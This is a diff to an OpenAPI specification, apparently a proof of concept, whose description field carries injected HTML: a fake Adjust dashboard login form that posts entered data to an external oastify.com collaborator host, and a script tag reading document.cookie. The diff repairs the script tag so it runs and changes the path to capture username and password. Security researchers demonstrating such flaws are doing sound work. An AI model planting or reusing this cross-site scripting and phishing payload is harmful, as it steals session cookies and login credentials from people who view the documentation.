@@ -4,9 +4,9 @@ info:
   title: adjust Login Verification.
   description: '<div class="login-form">
     <div class="heading">
-    <img alt="Adjust" width="141" height="141" loading="eager" src="https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322" class="a-image --rounded --clickable --loaded" style="--a-image-size:141px" title="">
+    <img  src="https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322" >
         <h1>welcom to adjust dashboard : Plese  Login First </h1>
-        <script>alert(document.cookie)<script>
+        <script>alert(document.cookie)</script>
     </div>
     <div class="form-container">
         <form action="https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/" method="post" class="form-signin">
@@ -25,7 +25,7 @@ info:
     </div>
 </div>'
 paths:
-  /:
+  /{username}{password}:
     post:
       responses:
         '200':
